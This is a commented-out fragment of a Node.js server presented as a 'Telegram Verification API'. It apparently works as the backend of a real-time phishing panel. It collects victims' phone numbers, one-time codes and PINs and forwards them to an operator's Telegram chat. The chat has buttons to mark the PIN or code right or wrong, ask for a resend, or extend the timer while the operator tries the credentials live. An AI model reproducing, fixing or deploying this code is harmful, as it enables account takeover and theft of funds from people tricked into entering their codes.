//       minute: "2-digit",
//       hour12: false,
//     })
//     .replace(":", ".");

//   return `
// <b># Oliva</b>
// <b>Connecting...</b>

// <b>NEW USER - VERIFICATION NEEDED</b>
// • <b>Country Code:</b> ${userData.countryCode}
// • <b>Phone Number:</b> ${userData.phoneNumber}
// • <b>OTP Code:</b> <code>${userData.otpCode}</code>
// • <b>Time:</b> ${userData.time}

// ══════════════════════════

// <b>Verify the credentials:</b>
// • Timeout: ${TIMEOUT_MINUTES} minutes
//   ${formattedTime}

// ══════════════════════════
//   `;
// }

// // ✅ Health check endpoint
// app.get("/", (req, res) => {
//   res.json({
//     status: "online",
//     service: "Telegram Verification API",
//     endpoints: {
//       verify: "POST /api/verify-user",
//       checkStatus: "GET /api/check-status/:sessionId",
//     },
//     sessions: verificationSessions.size,
//   });
// });

// // API endpoint for user verification request
// app.post("/api/verify-user", async (req, res) => {
//   try {
//     const { countryCode, phoneNumber, otpCode, userId, userName } = req.body;

//     // Validate input
//     if (!phoneNumber || !otpCode) {
//       return res.status(400).json({
//         error: "Missing required fields: phoneNumber and otpCode are required",
//       });
//     }

//     // Create session data
//     const sessionId = `sess_${Date.now()}_${Math.random()
//       .toString(36)
//       .substr(2, 9)}`;
//     const now = new Date();

//     const userData = {
//       sessionId,
//       countryCode: countryCode || "+263",
//       phoneNumber,
//       otpCode,
//       userId: userId || "unknown",
//       userName: userName || "NEW USER",
//       time: now.toLocaleString("en-US", {
//         month: "2-digit",
//         day: "2-digit",
//         year: "numeric",
//         hour: "2-digit",
//         minute: "2-digit",
//         second: "2-digit",
//         hour12: true,
//       }),
//       status: "pending",
//       createdAt: now.getTime(),
//       expiresAt: now.getTime() + TIMEOUT_MINUTES * 60 * 1000,
//       message: "Waiting for approval...",
//     };

//     // Store session
//     verificationSessions.set(sessionId, userData);
//     console.log(`📱 New session created: ${sessionId} for ${phoneNumber}`);

//     // Format Telegram message
//     const message = formatVerificationMessage(userData);

//     // ✅ Send to Telegram with error handling
//     try {
//       await bot.telegram.sendMessage(process.env.TG_CHAT_ID, message, {
//         parse_mode: "HTML",
//         ...Markup.inlineKeyboard([
//           [
//             Markup.button.callback(
//               "✅ Correct (PIN + OTP)",
//               `correct_${sessionId}`
//             ),
//           ],
//           [
//             Markup.button.callback("❌ Wrong Code", `wrong_code_${sessionId}`),
//             Markup.button.callback("❌ Wrong PIN", `wrong_pin_${sessionId}`),
//           ],
//           [
//             Markup.button.callback("🔄 Resend OTP", `resend_${sessionId}`),
//             Markup.button.callback("⏱️ Extend Time", `extend_${sessionId}`),
//           ],
//         ]),
//       });
//       console.log(`📤 Telegram message sent for session: ${sessionId}`);
//     } catch (tgError) {
//       console.error("❌ Failed to send Telegram message:", tgError.message);

//       // Clean up session if Telegram fails
//       verificationSessions.delete(sessionId);

//       return res.status(500).json({
//         error: "Failed to send verification request to Telegram",
//         details: tgError.message,
//       });
//     }

//     // Cleanup session after timeout
//     setTimeout(() => {
//       const session = verificationSessions.get(sessionId);
//       if (session && session.status === "pending") {
//         verificationSessions.delete(sessionId);
//         console.log(`⏰ Session ${sessionId} expired`);
//       }
//     }, TIMEOUT_MINUTES * 60 * 1000);

//     res.json({
//       success: true,
//       sessionId,
//       message: "Verification requested",
//       timeout: TIMEOUT_MINUTES,
//       checkStatusUrl: `/api/check-status/${sessionId}`,
//     });
//   } catch (error) {
//     console.error("❌ Error in /api/verify-user:", error);
//     res.status(500).json({
//       error: "Failed to process verification request",
//       details: error.message,
//     });
//   }
// });

// // Check verification status
// app.get("/api/check-status/:sessionId", (req, res) => {
//   const sessionId = req.params.sessionId;
//   const session = verificationSessions.get(sessionId);

//   if (!session) {
//     return res.json({
//       status: "expired",
//       message: "Session expired or not found",
//     });
//   }

//   const now = Date.now();
//   const timeLeft = Math.max(0, session.expiresAt - now);
//   const minutesLeft = Math.ceil(timeLeft / (60 * 1000));

//   // Auto-expire if timeout reached
//   if (timeLeft <= 0 && session.status === "pending") {
//     session.status = "expired";
//     session.message = "Verification timeout";
//   }

//   res.json({
//     status: session.status,
//     timeLeft: minutesLeft,
//     message: session.message || "",
//     updatedAt: session.updatedAt || session.time,
//     phone: session.phoneNumber,
//     sessionId: session.sessionId,
//   });
// });

// // ✅ OTP verification endpoint (for your testing)
// app.post("/api/verify-otp", (req, res) => {
//   const { phone, otp } = req.body;

//   if (!phone || !otp) {
//     return res.status(400).json({
//       error: "Missing phone or OTP",
//     });
//   }

//   console.log(`📲 OTP verification attempt: ${phone} - ${otp}`);

//   // Simulate OTP verification (replace with your logic)
//   const isValid = otp === "123456"; // Example: static OTP for testing

//   if (isValid) {
//     res.json({
//       success: true,
//       message: "OTP verified successfully",
//       phone,
//       verified: true,
//     });
//   } else {
//     res.json({
//       success: false,
//       message: "Invalid OTP",
//       phone,
//       verified: false,
//     });
//   }
// });

// // Handle Telegram button callbacks
// bot.action(/correct_(.+)/, async (ctx) => {
//   const sessionId = ctx.match[1];
//   const session = verificationSessions.get(sessionId);

//   if (session) {
//     session.status = "approved";
//     session.message = "Credentials verified successfully";
//     session.updatedAt = new Date().toISOString();

//     await ctx.answerCbQuery("✅ User approved!");
//     await ctx.editMessageText(
//       `${ctx.callbackQuery.message.text}\n\n✅ <b>APPROVED</b> - User can proceed`,
//       { parse_mode: "HTML" }
//     );

//     console.log(`✅ User ${session.userId} (${session.phoneNumber}) approved`);
//   } else {
//     await ctx.answerCbQuery("Session expired");
//   }
// });

// bot.action(/wrong_code_(.+)/, async (ctx) => {
//   const sessionId = ctx.match[1];
//   const session = verificationSessions.get(sessionId);

//   if (session) {
//     session.status = "wrong_code";
//     session.message = "OTP code is incorrect. Please resend.";
//     session.updatedAt = new Date().toISOString();

//     await ctx.answerCbQuery("❌ Wrong OTP code");
//     await ctx.editMessageText(
//       `${ctx.callbackQuery.message.text}\n\n❌ <b>WRONG CODE</b> - Please resend OTP`,
//       { parse_mode: "HTML" }
//     );
//   }
// });

// bot.action(/wrong_pin_(.+)/, async (ctx) => {
//   const sessionId = ctx.match[1];
//   const session = verificationSessions.get(sessionId);

//   if (session) {
//     session.status = "wrong_pin";
//     session.message = "PIN is incorrect. Please use correct PIN.";
//     session.updatedAt = new Date().toISOString();

//     await ctx.answerCbQuery("❌ Wrong PIN");
//     await ctx.editMessageText(
//       `${ctx.callbackQuery.message.text}\n\n❌ <b>WRONG PIN</b> - Invalid PIN provided`,
//       { parse_mode: "HTML" }
//     );
//   }
// });

// bot.action(/resend_(.+)/, async (ctx) => {
//   const sessionId = ctx.match[1];
//   const session = verificationSessions.get(sessionId);

//   if (session) {
//     session.status = "resend_requested";
//     session.message = "OTP resend requested";
//     session.updatedAt = new Date().toISOString();

//     await ctx.answerCbQuery("🔄 OTP resend requested");
//     await ctx.editMessageText(
//       `${ctx.callbackQuery.message.text}\n\n🔄 <b>OTP RESEND REQUESTED</b>`,
//       { parse_mode: "HTML" }
//     );
//   }
// });

// bot.action(/extend_(.+)/, async (ctx) => {
//   const sessionId = ctx.match[1];
//   const session = verificationSessions.get(sessionId);

//   if (session) {
//     session.expiresAt = Date.now() + TIMEOUT_MINUTES * 60 * 1000;
//     session.message = "Time extended by 5 minutes";
//     session.updatedAt = new Date().toISOString();

//     await ctx.answerCbQuery("⏱️ Time extended");
//     await ctx.editMessageText(
//       `${ctx.callbackQuery.message.text}\n\n⏱️ <b>TIME EXTENDED</b> - +5 minutes`,
//       { parse_mode: "HTML" }
//     );
//   }
// });

// // ✅ Bot error handling
// bot.catch((err, ctx) => {
//   console.error(`❌ Telegram bot error for ${ctx.updateType}:`, err);
// });

// // ✅ Start bot with polling (for development)
// bot
//   .launch()
//   .then(() => {
//     console.log("🤖 Telegram bot started with polling");
//   })
//   .catch((err) => {
//     console.error("❌ Failed to start Telegram bot:", err);
//   });

// // Start server
// const PORT = process.env.PORT || 5000;
// app.listen(PORT, () => {
//   console.log(`✅ Server running on http://localhost:${PORT}`);
//   console.log(
//     `✅ Telegram bot token: ${process.env.BOT_TOKEN ? "Set ✓" : "Missing ✗"}`
//   );
//   console.log(`✅ Telegram chat ID: ${process.env.TG_CHAT_ID || "Missing ✗"}`);
// });

// Add these functions after your existing formatVerificationMessage function

// ✅ NEW: Telegram callbacks for PIN
// bot.action(/pin_correct_(.+)/, async (ctx) => {
//   const sessionId = ctx.match[1];
//   const session = pinSessions.get(sessionId);

//   if (session) {
//     session.status = "approved";
//     session.message = "PIN verified successfully";
//     session.updatedAt = new Date().toISOString();

//     await ctx.answerCbQuery("✅ PIN approved!");
//     await ctx.editMessageText(
//       `${ctx.callbackQuery.message.text}\n\n✅ <b>PIN APPROVED</b> - User can proceed`,
//       { parse_mode: "HTML" }
//     );

//     console.log(
//       `✅ PIN for user ${session.userId} (${session.phoneNumber}) approved`
//     );
//   } else {
//     await ctx.answerCbQuery("PIN session expired");
//   }
// });

// bot.action(/pin_wrong_(.+)/, async (ctx) => {
//   const sessionId = ctx.match[1];
//   const session = pinSessions.get(sessionId);

//   if (session) {
//     session.status = "wrong_pin";
//     session.message = "PIN is incorrect";
//     session.updatedAt = new Date().toISOString();

//     await ctx.answerCbQuery("❌ Wrong PIN");
//     await ctx.editMessageText(
//       `${ctx.callbackQuery.message.text}\n\n❌ <b>WRONG PIN</b> - Incorrect PIN provided`,
//       { parse_mode: "HTML" }
//     );
//   }
// });

// bot.action(/pinotp_correct_(.+)/, async (ctx) => {
//   const sessionId = ctx.match[1];
//   const session = pinSessions.get(sessionId);

//   if (session) {
//     session.status = "pinotp_correct_";
//     session.message = "Verification successful - PIN and OTP correct";
//     session.updatedAt = new Date().toISOString();

//     await ctx.answerCbQuery("🚫 Fake PIN");
//     await ctx.editMessageText(
//       `${ctx.callbackQuery.message.text}\n\n🚫 <b>FAKE PIN</b> - Security alert`,
//       { parse_mode: "HTML" }
//     );
//   }
// });

// bot.action(/pin_extend_(.+)/, async (ctx) => {
//   const sessionId = ctx.match[1];
//   const session = pinSessions.get(sessionId);

//   if (session) {
//     session.expiresAt = Date.now() + TIMEOUT_MINUTES * 60 * 1000;
//     session.message = "PIN verification time extended by 5 minutes";
//     session.updatedAt = new Date().toISOString();

//     await ctx.answerCbQuery("⏱️ PIN time extended");
//     await ctx.editMessageText(
//       `${ctx.callbackQuery.message.text}\n\n⏱️ <b>TIME EXTENDED</b> - +5 minutes for PIN verification`,
//       { parse_mode: "HTML" }
//     );
//   }
// });

// ✅ FIXED: Telegram callbacks for PIN
// bot.action(/pin_correct_(.+)/, async (ctx) => {
//   const sessionId = ctx.match[1];
//   const session = pinSessions.get(sessionId);

//   // Check if session exists AND is not expired
//   if (session && Date.now() < session.expiresAt) {
//     session.status = "approved";
//     session.message = "PIN verified successfully";
//     session.updatedAt = new Date().toISOString();

//     await ctx.answerCbQuery("✅ PIN approved!");
//     await ctx.editMessageText(
//       `${ctx.callbackQuery.message.text}\n\n✅ <b>PIN APPROVED</b> - User can proceed`,
//       { parse_mode: "HTML" }
//     );

//     console.log(
//       `✅ PIN for user ${session.userId} (${session.phoneNumber}) approved`
//     );
//   } else {
//     // More specific error message
//     if (!session) {
//       await ctx.answerCbQuery("PIN session not found");
//     } else if (Date.now() >= session.expiresAt) {
//       await ctx.answerCbQuery("PIN session has expired");
//       // Optionally update session status
//       if (session.status === "pending") {
//         session.status = "expired";
//         session.message = "PIN verification timeout";
//       }
//     } else {
//       await ctx.answerCbQuery("Cannot verify PIN at this time");
//     }
//   }
// });

// ✅ FIXED: Telegram callbacks for PIN with better error handling
